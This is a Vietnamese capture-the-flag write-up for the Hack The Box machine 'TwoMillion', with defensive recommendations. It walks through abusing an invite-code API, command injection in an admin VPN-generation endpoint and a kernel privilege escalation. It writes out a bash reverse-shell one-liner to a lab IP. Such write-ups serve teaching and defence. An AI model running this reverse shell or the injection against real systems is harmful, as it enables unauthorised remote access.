---
title: "TwoMillion"
description: "Khai thac invite API, leo quyen admin qua API, tan cong command injection tren VPN generator va privilege escalation bang kernel exploit."
platform: "Hack The Box"
category: "Linux"
difficulty: "Easy"
publishedAt: 2026-07-30
tags: ["api", "invite-code", "command-injection", "reverse-shell", "linux", "privesc"]
draft: false
featured: true
cover: "/images/twomillion/two-million-02.png"
---

> Write-up nay duoc thuc hien trong moi truong lab co kiem soat. Chi ap dung cac ky thuat ben duoi tren he thong ma ban duoc phep kiem thu.

## Quet dich vu

Kiem tra cac port TCP dang mo tren may muc tieu:

![Ket qua quet Nmap](/images/twomillion/two-million-01.png)

May muc tieu co dich vu web dang chay, vi vay bat dau bang viec truy cap ung dung va quan sat cac file JavaScript duoc load:

![Kiem tra ung dung web va file JavaScript](/images/twomillion/two-million-02.png)

## Phan tich invite code API

Truy cap file JavaScript cua ung dung:

![Truy cap file JavaScript](/images/twomillion/two-million-03.png)

File JavaScript bi obfuscate, nen copy phan code nay dua qua cong cu deobfuscate de doc logic ben trong:

![Noi dung JavaScript sau khi deobfuscate](/images/twomillion/two-million-04.png)

Trong ham `makeInviteCode`, ung dung goi den endpoint:

```text
/api/v1/invite/how/to/generate
```

![Ham makeInviteCode goi endpoint goi y cach tao invite](/images/twomillion/two-million-05.png)

Khi goi endpoint nay, API tra ve mot chuoi da ma hoa. Sau khi decode, noi dung nhan duoc la:

```text
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

![API tra ve huong dan tao invite code](/images/twomillion/two-million-06.png)

Chuoi tra ve la Base64. Tiep tuc goi `POST /api/v1/invite/generate`, decode ket qua va thu duoc invite code:

```text
SZ1JG-326ND-L51VI-8OK7K
```

Luu y: invite code chi su dung duoc mot lan. Neu can code moi, chi can goi lai endpoint generate.

![Decode invite code tu Base64](/images/twomillion/two-million-07.png)

## Dang ky va enumerate API

Dung invite code de tao tai khoan, sau do truy cap trang Access va bat Burp Suite de quan sat request:

![Dang ky tai khoan bang invite code](/images/twomillion/two-million-08.png)

![Quan sat request trong Burp Suite](/images/twomillion/two-million-09.png)

Thu enumerate API:

![Enumerate cac API endpoint](/images/twomillion/two-million-10.png)

Lan dau request bi tra ve `401 Unauthorized` vi chua login. Dang nhap bang tai khoan vua tao:

![Dang nhap tai khoan moi tao](/images/twomillion/two-million-11.png)

![API tra ve thong tin sau khi da login](/images/twomillion/two-million-12.png)

Luc nay co the thay co cac endpoint nam duoi `/api/v1/admin`. Day la be mat tan cong quan trong vi chung lien quan den quyen admin va chuc nang tao VPN.

## Khai thac API admin

Thu lan luot cac endpoint admin va payload injection. Endpoint dang chu y la:

```text
/api/v1/admin/vpn/generate
```

Endpoint nay co the bi command injection thong qua du lieu dau vao:

![Phat hien command injection tren API tao VPN](/images/twomillion/two-million-13.png)

Dung reverse shell de may target chu dong ket noi ve may local:

```bash
sh -i >& /dev/tcp/10.10.14.69/9001 0>&1
```

![Gui payload reverse shell qua API](/images/twomillion/two-million-14.png)

Sau khi co shell, doc cac thong tin cau hinh va thu duoc thong tin dang nhap:

![Thu duoc thong tin dang nhap tren may target](/images/twomillion/two-million-15.png)

Thu ket noi SSH den may target:

![Ket noi SSH bang credential thu duoc](/images/twomillion/two-million-16.png)

![Doc user flag](/images/twomillion/two-million-17.png)

Nhu vay ta da lay duoc user flag trong thu muc cua user `admin`.

## Privilege escalation

Dua vao goi y cua Hack The Box va thong tin tren may, tiep tuc tim vector leo thang dac quyen:

![Goi y ve huong privilege escalation](/images/twomillion/two-million-18.png)

![Thong tin kernel va moi truong he thong](/images/twomillion/two-million-19.png)

Tu cac thong tin thu duoc, day la mot vulnerability co the dung de leo thang dac quyen tren Linux kernel. Su dung exploit open source tren GitHub:

![Tai exploit open source tu GitHub](/images/twomillion/two-million-20.png)

Tao HTTP server tren may local de may target tai file exploit:

![Mo HTTP server tren may local](/images/twomillion/two-million-21.png)

![May target tai file exploit](/images/twomillion/two-million-22.png)

Mo hai tab terminal: mot tab chay script exploit, tab con lai dung de truy cap shell quyen root:

![Chay exploit privilege escalation](/images/twomillion/two-million-23.png)

![Lay duoc shell root](/images/twomillion/two-million-24.png)

## Tong ket

### Exploit API

Phan khai thac API trong TwoMillion co hai diem quan trong:

- Ung dung de lo logic tao invite code o client-side JavaScript. Dung deobfuscate co the doc duoc endpoint noi bo `/api/v1/invite/how/to/generate`, tu do lan ra endpoint `POST /api/v1/invite/generate` de tao invite code hop le.
- Cac endpoint admin khong duoc bao ve chat che theo dung mo hinh phan quyen. Sau khi co account va enumerate API, attacker co the tiep can cac endpoint duoi `/api/v1/admin`, dac biet la chuc nang generate VPN.
- Endpoint `/api/v1/admin/vpn/generate` xu ly input khong an toan va dua du lieu nguoi dung vao command he thong. Day la command injection, cho phep chen payload reverse shell va lay foothold tren may target.

**Khuyen nghi phong thu:**

- Khong dat logic bao mat quan trong o client-side; JavaScript tren trinh duyet luon co the bi doc, deobfuscate va debug.
- Tat ca endpoint API can kiem tra authentication va authorization o server-side, dac biet voi endpoint admin.
- Khong noi chuoi input nguoi dung vao shell command. Neu bat buoc goi command he thong, can dung argument array, whitelist gia tri hop le va validate chat dau vao.
- Ghi log va canh bao cac request bat thuong den endpoint admin, nhat la cac payload co ky tu shell nhu `;`, `&`, `|`, `$()`, backtick hoac redirect.

### Privilege escalation

Sau khi co SSH vao user `admin`, muc tieu tiep theo la kiem tra thong tin he dieu hanh, kernel va cac goi dang cai. Goi y tu HTB cung voi thong tin tren may cho thay kernel dang ton tai mot loi co exploit cong khai. Khi exploit thanh cong, attacker co the chuyen tu user thuong len root va doc `root.txt`.

Day la mau privilege escalation pho bien trong CTF/lab: foothold ban dau den tu ung dung web, sau do leo quyen dua tren cau hinh he dieu hanh hoac kernel chua duoc cap nhat.

**Khuyen nghi phong thu:**

- Cap nhat kernel va security patch dinh ky, uu tien cac CVE co exploit cong khai.
- Ap dung nguyen tac least privilege cho user chay ung dung web va user he thong.
- Bat cac co che hardening nhu AppArmor/SELinux, restrict unprivileged user namespaces neu khong can thiet.
- Giam sat hanh vi bat thuong sau khai thac, vi du tai exploit ve `/tmp`, chay binary la, hoac mo ket noi nguoc ve IP ben ngoai.
